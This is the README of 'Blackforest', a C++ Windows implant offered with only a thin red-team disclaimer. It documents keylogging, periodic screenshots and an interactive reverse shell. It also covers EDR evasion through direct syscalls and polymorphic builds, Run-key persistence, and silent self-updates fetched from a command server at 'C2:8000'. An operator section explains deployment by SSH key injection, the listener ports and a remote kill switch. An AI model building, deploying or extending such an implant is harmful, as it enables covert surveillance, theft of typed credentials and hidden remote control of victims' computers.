# 🌲 Blackforest: Advanced Red Team Implant

> **⚠️ DOCUMENTATION LEVEL: DEEP TECHNICAL**
> **DISCLAIMER**: For Authorized Red Teaming & Educational Research ONLY.

## 1. Executive Summary
**Blackforest** is a C++ implant engineered for **Evasion**, **Persistence**, and **Silent Exfiltration**. Unlike standard shells, it operates as an autonomous agent with a self-healing network stack and a polymorphic engine that generates unique executable signatures for every build.

## 2. Technical Architecture (Deep Scan)

### A. Evasion & Anti-Analysis
The agent employs multiple layers of defense against EDR (Endpoint Detection & Response) and AV:

1.  **Direct Syscalls (Hell's Gate Variant)**:
    *   **Logic**: Instead of calling `kernel32.dll` APIs (which are hooked by EDRs), Blackforest mentally parses the `ntdll.dll` export table to find Syscall IDs.
    *   **Execution**: It constructs a custom stack frame (`SyscallFrame`) and executes the raw assembly (`syscall` instruction), bypassing user-mode hooks entirely.
    *   **Source**: `include/core/evasion/syscall_hook.hpp`.

2.  **Polymorphic Stub Generation**:
    *   **Engine**: `PolymorphicEngine` (Seed: Random or 1234).
    *   **Junk Code**: Inserts variable-length NOP sleds (`0x90`) and garbage instructions to alter the binary's entry point signature.
    *   **Runtime Decryption**: Function pointers are stored encrypted (`XOR 0xDEADBEEF`). A dynamic stub decrypts them just-in-time (JIT) before execution to hide control flow from static analysis.
    *   **Source**: `include/obfuscation/polymorphic.hpp`.

3.  **String Obfuscation**:
    *   All sensitive strings (IPs, Registry Keys) are XOR-encrypted (`Key: 0x55`) at compile time. They are decrypted only when needed on the stack.

### B. Persistence & Survival
The agent ensures it survives reboots and user actions:
*   **Registry**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` key `BlackforestUpdater`.
*   **File System**: Copies self to `%APPDATA%\Blackforest\Blackforest.exe`.
*   **Process State**: Launches with `DETACHED_PROCESS | CREATE_NO_WINDOW` flags. It creates no console window and ignores parent process termination signals (e.g., closing SSH).

### C. Networking (The "Silent" Stack)
*   **RAII Persistent Socket**: The `TcpClient` class manages a single socket. It does NOT open/close connections for every packet.
*   **Self-Healing**: If the connection breaks (EPIPE), it automatically resets the socket and retries without crashing the agent.
*   **Protocol**: `[KEYLOG]: <data>\n` (Plaintext over TCP for speed/simplicity).

---

## 3. Deployment (Passwordless)
We have automated the deployment pipeline to be "One-Click".

### Pre-Requisites (Run Once)
```bash
scripts/setup_ssh.sh
```
*   Generates `id_rsa` pair.
*   Injects public key into standard user's `authorized_keys`.
*   Enables passwordless `scp` and `ssh` execution.

### CI/CD Deployment
```bash
scripts/build.sh    # Compiles 'Golden' binary
scripts/deploy.sh   # Deploys to target
```
*   **Auto-Update**: The agent also polls `http://C2:8000/update.txt`. If you run `./build.sh`, active agents will see the new hash and upgrade themselves silently within 60 seconds.

---

## 4. Operational Guide (Team Server)
The **Team Server** unifies all Listeners into one dashboard.

**Start Server**:
```bash
python3 c2/server.py
```

| Port | Function | Description |
| :--- | :--- | :--- |
| **4444** | Data Receiver | Receives Keylogs, Heartbeats, Screenshots. |
| **4445** | Reverse Shell | Interactive `cmd.exe` sessions. |
| **8000** | Update Server | Hosts the binary for auto-updates. |

**Commands**:
*   `list`: View active Shell sessions.
*   `interact <ID>`: Enter a session.
*   **Logs**: All keylogs are saved to `blackforest_logs.txt`.

---

## 5. Emergency Codes (Kill Switch)
If the operation is compromised, you can remotely wipe all agents.

1.  Edit `update.txt` (served on Port 8000).
2.  Replace content with the **Kill Key**:
    ```text
    09827a801ea931cdacf6ee8828b3283add9e694764a8c0aea06f73b9eed66d22
    ```
3.  **Effect**:
    *   Agents detect the key.
    *   **Wipe**: Delete `Blackforest.exe`.
    *   **Clean**: Delete Registry Key.
    *   **Exit**: Terminate process.

---

## 6. Visual Architecture

### Agent Lifecycle

```mermaid
graph TD
    Start["🚀 Start"] --> Init["🛡️ Anti-Debug Check"]
    Init --> Persist["🔑 Install Persistence"]
    Persist --> Threads["🧵 Spawn Threads"]
    
    Threads --> Keys["⌨️ Keylogger (Buffer=1)"]
    Threads --> Screen["🖥️ Screenshot (30s)"]
    Threads --> Heart["❤️ Heartbeat (60s)"]
    Threads --> Update["📦 Updater (60s)"]
    
    Keys --> Encrypt["🔒 XOR Encryption"]
    Encrypt --> Net["🌐 TCP Send (Persistent)"]
```


*🌲 Navigate the forest. Remain unseen. 🌲*
